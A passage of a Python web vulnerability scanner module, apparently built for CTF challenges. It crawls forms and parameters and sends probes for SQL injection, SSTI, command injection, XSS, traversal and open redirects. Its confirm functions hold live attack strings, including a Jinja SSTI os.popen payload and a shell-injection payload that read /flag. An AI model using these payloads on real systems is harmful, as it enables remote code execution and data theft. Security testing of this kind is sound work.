from __future__ import annotations

import re
from collections import deque
from dataclasses import dataclass, field
from hashlib import sha256
from html import unescape
from html.parser import HTMLParser
from http.cookiejar import Cookie, CookieJar
from urllib.parse import parse_qsl, quote_plus, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import (
    Request,
    build_opener,
)

from .http_client import (
    read_bounded,
    scanner_handlers,
    validate_loopback_proxy,
)
from .jwt_audit import audit_jwt
from .model import Finding, ScanReport, redact_url
from .posture import inspect_response
from .session import BrowserSession, validate_session_cookie

CMD_PROBE = ";printf WCSA;printf $((7321+19));printf WCSZ"
CMD_RESULT = "WCSA7340WCSZ"
SSTI_PROBE = "{{7340*3}}"
SSTI_RESULT = "22020"
SSTI_ALTERNATE_PROBES = (
    ("dollar-brace", "${7340*3}"),
    ("erb-ejs", "<%= 7340*3 %>"),
    ("hash-brace", "#{7340*3}"),
)
XSS_PROBE = "<wcs7340>"
MAX_BODY = 1_000_000
HTML_MARKER = "<html"
COMMENT_HINTS = ("TODO", "FIXME", "BUG", "HACK", "FLAG", "SECRET", "PASSWORD", "ADMIN", "BACKDOOR", "DEBUG")
SQL_ERRORS = (
    "sql syntax", "sqlite error", "sqlite3.", "mysql_fetch", "mysqli_sql_exception",
    "pg_query", "postgresql error", "ora-", "unclosed quotation mark", "odbc sql",
)
DEBUG_ERRORS = (
    "traceback (most recent call last)", "stack trace", "werkzeug debugger",
    "debug mode", "exception in thread", "fatal error:",
)
FLAG_RE = re.compile(r"(?:flag|ctf|picoctf|htb)\s*\{[^}\r\n]{1,200}\}", re.I)
PROFILES = {
    "desktop": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Sec-CH-UA": '"Chromium";v="124", "Not-A.Brand";v="99"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
    },
    "mobile": {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Sec-CH-UA": '"Chromium";v="124", "Not-A.Brand";v="99"',
        "Sec-CH-UA-Mobile": "?1",
        "Sec-CH-UA-Platform": '"Android"',
    },
}


def _line_comment_end(text: str, start: int) -> int:
    """Return the end of a `//` comment starting at a line start, or -1."""
    index = start
    while index < len(text) and text[index] in " \t":
        index += 1
    if not text.startswith("//", index) or text.startswith("#", index + 2):
        return -1
    while index < len(text) and text[index] not in "\r\n":
        index += 1
    return index


def _js_comments(text: str) -> list[str]:
    """Collect line-start `//` comments and `/* */` blocks in one linear pass."""
    comments: list[str] = []
    index = 0
    block_possible = True
    while index < len(text):
        if index == 0 or text[index - 1] == "\n":
            end = _line_comment_end(text, index)
            if end >= 0:
                comments.append(text[index:end])
                index = max(end, index + 1)
                continue
        if block_possible and text.startswith("/*", index):
            close = text.find("*/", index + 2)
            if close >= 0:
                comments.append(text[index:close + 2])
                index = close + 2
                continue
            block_possible = False
        index += 1
    return comments


def _comment_keywords(comment: str) -> set[str]:
    """Return names of interesting keywords, never raw comment content."""
    if len(comment) > 100_000:
        comment = comment[:100_000]
    return {token for token in COMMENT_HINTS
            if re.search(r"(?<![A-Za-z0-9_])" + token + r"(?![A-Za-z0-9_])",
                         comment, re.I)}


_HYPOTHESIS_RULES = (
    (r"(?:^|_)(?:id|q|query|search|user|name|item)(?:$|_)", "WEB-SQLI-001",
     "Possible SQL injection input", "'",
     "Use a parameterized query; never concatenate input into SQL."),
    (None, "WEB-SSTI-001", "Possible server-side template injection input", SSTI_PROBE,
     "Treat templates as code: select fixed templates and pass user data only as values."),
    (r"(?:^|_)(?:q|query|search|name|msg|message|comment|text|input|keyword)(?:$|_)",
     "WEB-XSS-001", "Possible reflected cross-site scripting input", XSS_PROBE,
     "Context-encode output (HTML entity/attribute/JS) and set a restrictive Content-Security-Policy."),
    (r"(?:^|_)(?:cmd|command|exec|host|ip|ping)(?:$|_)", "WEB-CMDI-001",
     "Possible command injection input", CMD_PROBE,
     "Avoid shell invocation; use fixed argument arrays and strict allowlists."),
    (r"(?:^|_)(?:file|path|page|include|template|view)(?:$|_)", "WEB-FILE-001",
     "Possible file/path injection input", "../WCS_NONEXISTENT",
     "Map identifiers to fixed server-side resources; canonicalize and enforce a root."),
    (r"(?:^|_)(?:next|url|uri|redirect|return|continue)(?:$|_)", "WEB-REDIR-001",
     "Possible open redirect or server-side URL input", "https://example.invalid/wcs",
     "Allowlist destinations and reject absolute or cross-origin URLs."),
)
# Rules whose pattern is also accepted for every parameter in generic mode.
_GENERIC_HYPOTHESES = {"WEB-SQLI-001", "WEB-SSTI-001", "WEB-XSS-001"}
_HYPOTHESIS_EVIDENCE = {
    "WEB-SQLI-001": "database error or stable boolean response differential",
    "WEB-SSTI-001": SSTI_RESULT,
    "WEB-CMDI-001": CMD_RESULT,
    "WEB-XSS-001": f"unencoded reflection of {XSS_PROBE}",
}


def _hypothesis_applies(rule: tuple, key: str, generic: bool) -> bool:
    pattern = rule[0]
    if generic and rule[1] in _GENERIC_HYPOTHESES:
        return True
    return pattern is not None and re.search(pattern, key) is not None

_ACTIVE_PROBES = {
    "WEB-CMDI-001": CMD_PROBE,
    "WEB-SSTI-001": SSTI_PROBE,
    "WEB-FILE-001": "../WCS_NONEXISTENT_7f31a9",
    "WEB-REDIR-001": "https://example.invalid/wcs",
    "WEB-XSS-001": XSS_PROBE,
}


@dataclass
class Form:
    action: str
    method: str
    inputs: list[tuple[str, str, str]] = field(default_factory=list)


class PageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []
        self.scripts: list[str] = []
        self.forms: list[Form] = []
        self.comment_hints: set[str] = set()
        self._form: Form | None = None
        self._select_index: int | None = None
        self._select_has_option = False
        self._select_has_selected = False
        self._option_value: str | None = None
        self._option_selected = False
        self._option_text: list[str] = []
        self._option_open = False
        self._textarea_index: int | None = None
        self._textarea_text: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        data = {k.lower(): (v or "") for k, v in attrs}
        name = tag.lower()
        if name in {"a", "link"} and data.get("href"):
            self._add_anchor_link(name, data)
        elif name in {"iframe", "frame"} and data.get("src"):
            self.links.append(data["src"])
        elif name == "script" and data.get("src"):
            self.scripts.append(data["src"])
        elif name == "form":
            self._start_form(data)
        elif name == "select" and self._form and data.get("name"):
            self._start_select(data)
        elif name == "option" and self._form and self._select_index is not None:
            self._add_option(attrs, data)
        elif name == "textarea" and self._form and data.get("name"):
            self._textarea_index = len(self._form.inputs)
            self._textarea_text = []
            self._form.inputs.append((data["name"], "textarea", ""))
        elif name == "input" and self._form and data.get("name"):
            self._form.inputs.append((data["name"], data.get("type", "text").lower(), data.get("value", "")))

    def _add_anchor_link(self, name: str, data: dict[str, str]) -> None:
        if name == "a" or data.get("rel", "").lower() in {"canonical", "alternate"}:
            self.links.append(data["href"])

    def _start_form(self, data: dict[str, str]) -> None:
        self._form = Form(data.get("action", ""), data.get("method", "get").upper())
        self.forms.append(self._form)
        if self._form.method == "GET" and self._form.action:
            self.links.append(self._form.action)

    def _start_select(self, data: dict[str, str]) -> None:
        self._select_index = len(self._form.inputs)
        self._select_has_option = False
        self._select_has_selected = False
        self._clear_option()
        self._form.inputs.append((data["name"], "select", ""))

    def _add_option(self, attrs: list[tuple[str, str | None]], data: dict[str, str]) -> None:
        self._finish_option()
        self._option_selected = any(key.lower() == "selected" for key, _ in attrs)
        self._option_value = data["value"] if any(
            key.lower() == "value" for key, _ in attrs) else None
        self._option_text = []
        self._option_open = True

    def _finish_option(self) -> None:
        if self._select_index is None or not self._option_open:
            return
        selected = self._option_selected
        if (selected and not self._select_has_selected) or (
                not self._select_has_option and not self._select_has_selected):
            value = self._option_value
            if value is None:
                value = " ".join("".join(self._option_text).split())
            name, kind, _ = self._form.inputs[self._select_index]
            self._form.inputs[self._select_index] = (name, kind, value)
        self._select_has_option = True
        self._select_has_selected |= selected
        self._clear_option()

    def _clear_option(self) -> None:
        self._option_value = None
        self._option_selected = False
        self._option_text = []
        self._option_open = False

    def handle_data(self, data: str) -> None:
        if self._select_index is not None:
            self._option_text.append(data)
        if self._textarea_index is not None:
            self._textarea_text.append(data)

    def handle_comment(self, data: str) -> None:
        if len(self.comment_hints) < len(COMMENT_HINTS):
            self.comment_hints.update(_comment_keywords(data))

    def handle_endtag(self, tag: str) -> None:
        name = tag.lower()
        if name == "textarea" and self._textarea_index is not None:
            field_name, kind, _ = self._form.inputs[self._textarea_index]
            self._form.inputs[self._textarea_index] = (
                field_name, kind, "".join(self._textarea_text))
            self._textarea_index = None
            self._textarea_text = []
        elif name == "option":
            self._finish_option()
        elif name == "select":
            self._finish_option()
            self._select_index = None
            self._select_has_option = False
            self._select_has_selected = False
        elif name == "form":
            self._finish_option()
            self._textarea_index = None
            self._textarea_text = []
            self._form = None
            self._select_index = None


@dataclass
class Response:
    url: str
    status: int
    headers: dict[str, str]
    text: str
    cookie_headers: tuple[str, ...] = ()


@dataclass(frozen=True)
class PageObservation:
    url: str
    status: int
    body_length: int
    body_sha256: str
    forms: tuple[tuple[str, str, tuple[str, ...]], ...]
    parameters: tuple[str, ...]


class Scanner:
    def __init__(self, target: str, *, active: bool = False, max_pages: int = 20,
                 timeout: float = 5.0, max_requests: int = 80, verify_tls: bool = True,
                 profile: str = "desktop", session: BrowserSession | None = None,
                 proxy: str | None = None,
                 inventory_urls: tuple[str, ...] = (),
                 ssti_alternates: bool = False,
                 nosql_query: bool = False) -> None:
        parsed = urlsplit(target)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc or parsed.username or parsed.password:
            raise ValueError("target must be an absolute http:// or https:// URL")
        self.target = self._clean_url(target)
        self.origin = (parsed.scheme.lower(), parsed.netloc.lower())
        self.active = active
        self.ssti_alternates = ssti_alternates
        self.nosql_query = nosql_query
        self.max_pages = max(1, max_pages)
        self.timeout = max(0.1, timeout)
        self.max_requests = max(1, max_requests)
        if profile not in PROFILES:
            raise ValueError("profile must be desktop or mobile")
        self.profile = profile
        self.session = session
        self.proxy = self._validate_proxy(proxy)
        if len(inventory_urls) > 100 or any(
                not self._in_scope(url) or urlsplit(url).username or urlsplit(url).password
                for url in inventory_urls):
            raise ValueError("inventory seeds must be bounded same-origin HTTP URLs")
        self.inventory_urls = tuple(sorted({self._clean_url(url) for url in inventory_urls}))
        self.requests_sent = 0
        self.observations: dict[str, PageObservation] = {}
        self.cookies = CookieJar()
        if session:
            self._import_session_cookies(session)
        self.opener = build_opener(*scanner_handlers(
            self.origin, self.cookies, verify_tls=verify_tls, proxy=self.proxy,
        ))

    @staticmethod
    def _validate_proxy(proxy: str | None) -> str | None:
        return validate_loopback_proxy(proxy)

    def _import_session_cookies(self, session: BrowserSession) -> None:
        host = urlsplit(self.target).hostname or ""
        for item in session.cookies:
            validate_session_cookie(item.name, item.value, item.domain, item.path)
            domain = item.domain.lstrip(".") or host
            if host != domain and not host.endswith("." + domain):
                raise ValueError("captured session contains a cookie outside the target origin")
            self.cookies.set_cookie(Cookie(
                version=0, name=item.name, value=item.value, port=None, port_specified=False,
                domain=domain, domain_specified=bool(item.domain),
                domain_initial_dot=item.domain.startswith("."), path=item.path or "/",
                path_specified=True, secure=item.secure, expires=item.expires,
                discard=item.expires is None, comment=None, comment_url=None,
                rest={"HttpOnly": item.http_only, "SameSite": item.same_site}, rfc2109=False,
            ))

    @staticmethod
    def _clean_url(url: str) -> str:
        p = urlsplit(url)
        return urlunsplit((p.scheme.lower(), p.netloc.lower(), p.path or "/", p.query, ""))

    def _in_scope(self, url: str) -> bool:
        p = urlsplit(url)
        return (p.scheme.lower(), p.netloc.lower()) == self.origin

    def _request(self, url: str, method: str = "GET", data: bytes | None = None) -> Response:
        if self.requests_sent >= self.max_requests:
            raise RuntimeError("request budget exhausted")
        if not self._in_scope(url):
            raise ValueError("cross-origin request blocked")
        self.requests_sent += 1
        headers = {
            **PROFILES[self.profile],
            "Accept": "text/html,application/json,text/plain,*/*;q=0.5",
            "Accept-Language": "en-US,en;q=0.8",
            "Cache-Control": "no-store, no-cache, max-age=0",
            "Pragma": "no-cache",
        }
        if self.session:
            headers.update(dict(self.session.headers))
        if data is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = Request(url, data=data, method=method, headers=headers)
        result = read_bounded(self.opener, req, self.timeout, MAX_BODY)
        charset = ("utf-8" if result.http_error else
                   (result.headers.get_content_charset() or "utf-8"))
        cookies = tuple(result.headers.get_all("Set-Cookie", [])) if hasattr(
            result.headers, "get_all") else ()
        return Response(result.url, result.status,
                        {k.lower(): v for k, v in result.headers.items()},
                        result.body.decode(charset, "replace"), cookies)

    def _finding(self, **kwargs: object) -> Finding:
        kwargs.setdefault("profile", self.profile)
        headers = {**PROFILES[self.profile]}
        if self.session:
            headers.update(dict(self.session.headers))
        kwargs.setdefault("client_headers", tuple(sorted(
            (name, value) for name, value in headers.items()
            if name.lower() in {"user-agent", "accept-language", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"}
        )))
        if "session_cookies" not in kwargs:
            kwargs["session_cookies"] = tuple(sorted((cookie.name, cookie.value) for cookie in self.cookies))
        return Finding(**kwargs)  # type: ignore[arg-type]

    @staticmethod
    def _observe(response: Response, parser: PageParser) -> PageObservation:
        forms = tuple(sorted(
            (form.method, form.action, tuple(sorted(name for name, _, _ in form.inputs)))
            for form in parser.forms
        ))
        parameters = {name for form in parser.forms for name, _, _ in form.inputs}
        parameters.update(name for name, _ in parse_qsl(urlsplit(response.url).query, keep_blank_values=True))
        encoded = response.text.encode("utf-8", "replace")
        return PageObservation(
            url=response.url,
            status=response.status,
            body_length=len(encoded),
            body_sha256=sha256(encoded).hexdigest(),
            forms=forms,
            parameters=tuple(sorted(parameters)),
        )

    def _jwt_metadata_hints(self, response: Response) -> list[Finding]:
        """Inspect JWT-shaped tokens in already-read text/cookies without disclosure."""
        candidates = []
        for token in re.findall(
            r"(?<![A-Za-z0-9_-])(eyJ[A-Za-z0-9_-]{4,1200}\.eyJ[A-Za-z0-9_-]{4,1200}\.[A-Za-z0-9_-]{0,1500})(?![A-Za-z0-9_-])",
            response.text[:MAX_BODY],
        )[:5]:
            candidates.append(("response", token))
        for cookie in list(self.cookies)[:50]:
            if cookie.value and cookie.value.startswith("eyJ") and cookie.value.count(".") == 2:
                candidates.append(("cookie", cookie.value))
                if len(candidates) >= 10:
                    break
        sources = set()
        signals = set()
        for source, token in candidates[:10]:
            try:
                audit = audit_jwt(token)
            except ValueError:
                continue
            sources.add(source)
            signals.update(item["rule"] for item in audit["signals"])
        if not sources:
            return []
        return [self._finding(
            rule="WEB-JWT-METADATA-001",
            title="JWT-shaped authentication metadata observed",
            severity="info", confidence="low", url=response.url,
            evidence=("JWT-like token found in " + ", ".join(sorted(sources)) +
                      "; review categories: " + (", ".join(sorted(signals)) or "none") +
                      "; token, cookie names and claim values omitted."),
            vector=f"Review the existing GET {redact_url(response.url)} response and local session securely.",
            patch="Verify JWT signatures, issuer, audience and server-side authorization with a strict algorithm allowlist.",
            session_cookies=(),
        )]

    def _posture_findings(self, response: Response, method: str = "GET") -> list[Finding]:
        """Analyze existing response metadata without additional HTTP requests.

        Document policies apply only to HTML GET documents. Other responses
        are eligible for the CORS consistency signal only.
        """
        content_type = response.headers.get("content-type", "").lower()
        is_document = (method == "GET" and 200 <= response.status < 300
                       and ("text/html" in content_type or
                            (HTML_MARKER in response.text[:500].lower() and
                             not content_type.startswith(("application/json", "text/plain")))))
        path = urlsplit(response.url).path or "/"
        observations = inspect_response(
            method, path, "Document" if is_document else "Other",
            response.status, response.headers, self.origin[0] == "https",
            cookie_headers=response.cookie_headers or None,
        )
        patches = {
            "HEADER-HSTS": "Configure Strict-Transport-Security on HTTPS responses.",
            "HEADER-CSP": "Set a restrictive Content-Security-Policy tailored to the application.",
            "HEADER-NOSNIFF": "Send X-Content-Type-Options: nosniff.",
            "HEADER-FRAMING": "Apply CSP frame-ancestors or X-Frame-Options to restrict framing.",
            "HEADER-CORS-CONFLICT": "Avoid combining wildcard allowed origins with credentialed CORS; configure explicit trusted origins.",
            "COOKIE-SECURE": "Set Secure on HTTPS cookies.",
            "COOKIE-HTTPONLY": "Set HttpOnly for cookies not intended for JavaScript.",
            "COOKIE-SAMESITE": "Select an explicit SameSite policy appropriate to the application.",
            "COOKIE-SAMESITE-NONE": "Use Secure together with SameSite=None.",
        }
        return [self._finding(
            rule=item["rule"], title=item["title"],
            severity=item["severity"], confidence=item["confidence"],
            url=response.url, method=method, evidence=item["evidence"],
            vector=f"{method} {redact_url(response.url)}; inspect response headers.",
            patch=patches.get(item["rule"], "Review the response header configuration."),
        ) for item in observations]

    def _passive_findings(self, response: Response, parser: PageParser) -> list[Finding]:
        out: list[Finding] = self._jwt_metadata_hints(response)
        low = response.text.lower()
        if any(token in low for token in DEBUG_ERRORS):
            out.append(self._finding(rule="WEB-DEBUG-001", title="Debug or stack-trace disclosure",
                severity="medium", confidence="high", url=response.url,
                evidence="The response contains a deterministic debug/stack-trace signature.",
                vector=f"GET {redact_url(response.url)}",
                patch="Disable production debug mode; return generic errors and keep traces in server-side logs."))
        if re.search(r"<title>\s*index of /", response.text, re.I):
            out.append(self._finding(rule="WEB-LIST-001", title="Directory listing exposed",
                severity="medium", confidence="high", url=response.url,
                evidence="HTML title matches an automatic directory index.", vector=f"GET {redact_url(response.url)}",
                patch="Disable directory indexes and explicitly publish only required files."))
        if self.origin[0] == "http" and any(t == "password" for form in parser.forms for _, t, _ in form.inputs):
            out.append(self._finding(rule="WEB-HTTP-001", title="Password submitted over cleartext HTTP",
                severity="high", confidence="high", url=response.url,
                evidence="A password input is served from an HTTP origin.",
                vector="Observe the password-bearing request on the network path.",
                patch="Serve the challenge over HTTPS and redirect HTTP before rendering login forms."))
        flag = FLAG_RE.search(response.text)
        if flag:
            out.append(self._finding(rule="WEB-FLAG-CANDIDATE-001", title="Flag-shaped value in passive response",
                severity="medium", confidence="medium", url=response.url,
                evidence=f"Response contains a flag-shaped candidate: {flag.group(0)[:220]}",
                vector=f"GET {redact_url(response.url)} and verify that the value is accepted by the challenge.",
                flag_path="The value may be a decoy, example, or real flag. Passive text alone cannot distinguish them.",
                patch="Remove secrets from public responses and enforce authorization at the data boundary."))
        if parser.comment_hints:
            out.append(self._comment_hint_finding(response, parser.comment_hints))
        for form in parser.forms:
            defaults = tuple((name, value) for name, input_type, value in form.inputs
                             if input_type not in {"submit", "button", "image", "reset", "file"})
            action = self._clean_url(urljoin(response.url, form.action or response.url))
            if not self._in_scope(action):
                continue
            for name, input_type, _ in form.inputs:
                user_controlled = input_type not in {
                    "hidden", "submit", "button", "image", "reset", "file"
                }
                out.extend(self._parameter_hypotheses(
                    action, form.method, name, defaults, generic=user_controlled
                ))
        for name, _ in parse_qsl(urlsplit(response.url).query, keep_blank_values=True):
            out.extend(self._parameter_hypotheses(
                response.url, "GET", name,
                tuple(parse_qsl(urlsplit(response.url).query, keep_blank_values=True)),
                generic=True,
            ))
        return out

    def _parameter_hypotheses(self, url: str, method: str, name: str,
                              defaults: tuple[tuple[str, str], ...] = (), *,
                              generic: bool = False) -> list[Finding]:
        key = name.lower()
        rules = [rule for rule in _HYPOTHESIS_RULES if _hypothesis_applies(rule, key, generic)]
        return [self._finding(rule=rule, title=title, severity="info", confidence="low", url=url,
            parameter=name, evidence=f"Parameter name '{name}' in a {method} form/query matches a sink-oriented heuristic; no vulnerability is claimed.",
            vector=f"{method} {redact_url(url)} with {name}={payload!r}", patch=patch,
            method=method, request_fields=defaults, proof_payload=payload,
            expected_evidence=_HYPOTHESIS_EVIDENCE.get(rule, "status/body differential"))
            for _, rule, title, payload, patch in rules]

    @staticmethod
    def _set_query(url: str, parameter: str, value: str) -> str:
        p = urlsplit(url)
        pairs = parse_qsl(p.query, keep_blank_values=True)
        replaced = False
        out = []
        for k, v in pairs:
            if k == parameter:
                out.append((k, value)); replaced = True
            else:
                out.append((k, v))
        if not replaced:
            out.append((parameter, value))
        return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out), ""))

    def _send_probe(self, finding: Finding, value: str) -> Response:
        fields = dict(finding.request_fields)
        fields[finding.parameter] = value
        if finding.method == "POST":
            return self._request(finding.url, "POST", urlencode(fields).encode())
        url = finding.url
        for key, field_value in fields.items():
            url = self._set_query(url, key, field_value)
        return self._request(url)

    def _active_probe(self, finding: Finding) -> Finding | None:
        if finding.parameter == "" or self.requests_sent + 2 > self.max_requests:
            return None
        probe = _ACTIVE_PROBES.get(finding.rule, "'")
        baseline, tested = self._send_probe(finding, "WCSBASE"), self._send_probe(finding, probe)
        return (
            self._confirm_sqli_error(finding, probe, baseline, tested)
            or self._confirm_sqli_boolean(finding)
            or self._confirm_ssti(finding, baseline, tested)
            or self._confirm_ssti_alternates(finding, baseline)
            or self._confirm_cmdi(finding, probe, baseline, tested)
            or self._confirm_redirect(finding, probe, tested)
            or self._confirm_file_path(finding, probe, baseline, tested)
            or self._confirm_xss(finding, probe, baseline, tested)
        )

    def _confirm_sqli_error(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        body_low = tested.text.lower()
        if finding.rule == "WEB-SQLI-001" and any(sig in body_low for sig in SQL_ERRORS) and not any(sig in baseline.text.lower() for sig in SQL_ERRORS):
            return self._finding(rule=finding.rule, title="SQL injection error behavior confirmed", severity="high", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence="A quote introduces a database error signature absent from the baseline response.",
                vector=f"{method} {redact_url(finding.url)} with {finding.parameter}=' confirms parser reachability; derive a DB-specific read-only UNION/boolean payload manually.",
                patch="Use prepared statements with bound parameters and a least-privileged database account.",
                flag_path="The parameter reaches a SQL parser. Recovering the flag still requires schema/context discovery; this scan does not extract data.",
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence="database error signature absent from baseline")
        return None

    def _confirm_sqli_boolean(self, finding: Finding) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-SQLI-001" and self.requests_sent + 4 <= self.max_requests:
            true_payload = "' OR '1'='1'-- "
            false_payload = "' OR '1'='2'-- "
            true_one, false_one = self._send_probe(finding, true_payload), self._send_probe(finding, false_payload)
            true_two, false_two = self._send_probe(finding, true_payload), self._send_probe(finding, false_payload)

            def sql_signature(response: Response, payload: str) -> tuple[int, str]:
                # Remove simple reflection before comparing. This prevents an echo
                # endpoint from becoming a false SQLi confirmation.
                text = unescape(response.text)
                for reflected in (payload, quote_plus(payload)):
                    text = text.replace(reflected, "[INPUT]")
                return response.status, sha256(text.encode("utf-8", "replace")).hexdigest()

            true_sig = sql_signature(true_one, true_payload)
            false_sig = sql_signature(false_one, false_payload)
            if (true_sig == sql_signature(true_two, true_payload)
                    and false_sig == sql_signature(false_two, false_payload)
                    and true_sig != false_sig):
                return self._finding(
                    rule=finding.rule, title="SQL injection boolean behavior confirmed",
                    severity="high", confidence="high", url=finding.url,
                    parameter=finding.parameter,
                    evidence=("Two repeated tautology requests and two repeated contradiction "
                              "requests produced stable, distinct responses after removing input reflection."),
                    vector=(f"{method} {redact_url(finding.url)}: compare "
                            f"{finding.parameter}={true_payload!r} with "
                            f"{finding.parameter}={false_payload!r}."),
                    patch="Use prepared statements with bound parameters and a least-privileged database account.",
                    flag_path=("Boolean SQL evaluation is proven. Derive schema-specific extraction only from "
                               "the observed DB/query context; no universal flag query can be claimed."),
                    method=method, request_fields=finding.request_fields,
                    proof_payload=true_payload,
                    expected_evidence="stable response differs from the contradiction pair",
                )
        return None

    def _confirm_ssti(self, finding: Finding, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if (finding.rule == "WEB-SSTI-001" and SSTI_RESULT in tested.text
                and SSTI_RESULT not in baseline.text and SSTI_RESULT not in SSTI_PROBE):
            recovery = "{{cycler.__init__.__globals__.os.popen('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null').read()}}"
            return self._finding(
                rule=finding.rule, title="Jinja-style template expression evaluation confirmed",
                severity="critical", confidence="high", url=finding.url,
                parameter=finding.parameter,
                evidence=f"The response contains computed result {SSTI_RESULT}, absent from the payload and baseline.",
                vector=(f"Proof: {method} {redact_url(finding.url)} with "
                        f"{finding.parameter}={SSTI_PROBE!r}. Recovery: same request with the supplied payload."),
                patch="Do not compile user-controlled template source; render fixed templates with user data as values.",
                exploit_status="payload-ready", method=method,
                request_fields=finding.request_fields, proof_payload=SSTI_PROBE,
                expected_evidence=SSTI_RESULT, recovery_payload=recovery,
                flag_path="Jinja expression syntax was verified; the recovery payload reads common CTF flag paths.",
            )
        return None

    def _confirm_ssti_alternates(self, finding: Finding, baseline: Response) -> Finding | None:
        method = finding.method
        if (self.ssti_alternates and finding.rule == "WEB-SSTI-001"
                and SSTI_RESULT not in baseline.text):
            # Repeated arithmetic evaluations only; never infer an RCE payload.
            # Each pair is budget-checked and the target is not probed at all
            # unless the operator explicitly enabled --active.
            for family, alternate in SSTI_ALTERNATE_PROBES:
                if self.requests_sent + 2 > self.max_requests:
                    break
                first, second = self._send_probe(finding, alternate), self._send_probe(finding, alternate)
                if (SSTI_RESULT not in alternate
                        and SSTI_RESULT in first.text and SSTI_RESULT in second.text
                        and first.status == second.status
                        and sha256(first.text.encode()).digest() ==
                            sha256(second.text.encode()).digest()):
                    return self._finding(
                        rule=finding.rule,
                        title="Alternative template arithmetic syntax evaluated",
                        severity="high", confidence="medium", url=finding.url,
                        parameter=finding.parameter,
                        evidence=(f"Two identical {family} arithmetic probes yielded "
                                  f"computed result {SSTI_RESULT}, absent from the "
                                  "baseline and submitted expression; template engine "
                                  "and exploitability still require manual verification."),
                        vector=(f"Repeat {method} {redact_url(finding.url)} with "
                                f"{finding.parameter}={alternate!r}."),
                        patch="Never render user-supplied template source; pass untrusted input only as data.",
                        exploit_status="validation-only", method=method,
                        request_fields=finding.request_fields,
                        proof_payload=alternate, expected_evidence=SSTI_RESULT,
                        flag_path="Only arithmetic evaluation was observed; no automatic recovery payload exists.",
                    )
        return None

    def _confirm_cmdi(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-CMDI-001" and CMD_RESULT in tested.text and CMD_RESULT not in baseline.text and CMD_RESULT not in CMD_PROBE:
            recovery = ";printf WCSA;cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null;printf WCSZ"
            return self._finding(rule=finding.rule, title="Command injection arithmetic execution confirmed", severity="critical", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence=f"The response contains delimited computed output {CMD_RESULT}; that result is absent from both payload and baseline.",
                vector=f"Proof: {method} {redact_url(finding.url)} with {finding.parameter}={CMD_PROBE!r}. Recovery: same request with {finding.parameter}={recovery!r}.",
                patch="Remove shell execution; call the intended program with a fixed argument vector and allowlisted values.",
                exploit_status="payload-ready",
                flag_path=f"The verified shell syntax supports the recovery payload for {finding.parameter}; the scanner does not submit it automatically.",
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence=CMD_RESULT, recovery_payload=recovery)
        return None

    def _confirm_redirect(self, finding: Finding, probe: str, tested: Response) -> Finding | None:
        method = finding.method
        location = tested.headers.get("location", "")
        if finding.rule == "WEB-REDIR-001" and location and urlsplit(urljoin(finding.url, location)).netloc == "example.invalid":
            return self._finding(rule=finding.rule, title="Cross-origin redirect confirmed", severity="medium", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence="The response navigation reaches the supplied external origin.", vector=f"Set {finding.parameter}=https://example.invalid/wcs",
                patch="Resolve redirects against a strict same-origin path allowlist.", method=method,
                request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence="Location header points to example.invalid")
        return None

    def _confirm_file_path(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-FILE-001" and tested.status != baseline.status:
            return self._finding(rule=finding.rule, title="Path input changes resource behavior", severity="low", confidence="medium",
                url=finding.url, parameter=finding.parameter,
                evidence=f"A traversal-shaped nonexistent path changes HTTP status {baseline.status} -> {tested.status}; no file was read.",
                vector=f"Set {finding.parameter}=../WCS_NONEXISTENT_7f31a9 to reproduce the differential.", patch=finding.patch,
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence=f"HTTP status differs from baseline {baseline.status}")
        return None

    def _confirm_xss(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-XSS-001" and XSS_PROBE in tested.text and XSS_PROBE not in baseline.text:
            ctype = tested.headers.get("content-type", "").lower()
            if "html" in ctype or HTML_MARKER in tested.text[:500].lower():
                return self._finding(rule=finding.rule, title="Reflected HTML/script injection confirmed", severity="high", confidence="high",
                    url=finding.url, parameter=finding.parameter,
                    evidence=f"The marker {XSS_PROBE} is reflected unencoded in an HTML response and is absent from the baseline, so '<' and '>' are not entity-encoded.",
                    vector=f"Proof: {method} {redact_url(finding.url)} with {finding.parameter}={XSS_PROBE!r}. Escalate manually to a script payload within the reflection context.",
                    patch=finding.patch,
                    flag_path="Unencoded reflection is proven. A working XSS payload depends on the surrounding HTML/JS context and is not injected automatically.",
                    method=method, request_fields=finding.request_fields, proof_payload=probe,
                    expected_evidence=f"unencoded {XSS_PROBE} absent from baseline")
        return None

    def _nosql_query_review(self, finding: Finding) -> Finding | None:
        """Conservative repeated GET scalar/bracket differential; never proof."""
        if self.requests_sent + 4 > self.max_requests:
            return None
        if finding.method != "GET" or not re.fullmatch(
                r"[A-Za-z]\w{0,39}", finding.parameter, re.ASCII):
            return None
        params = parse_qsl(urlsplit(finding.url).query, keep_blank_values=True)
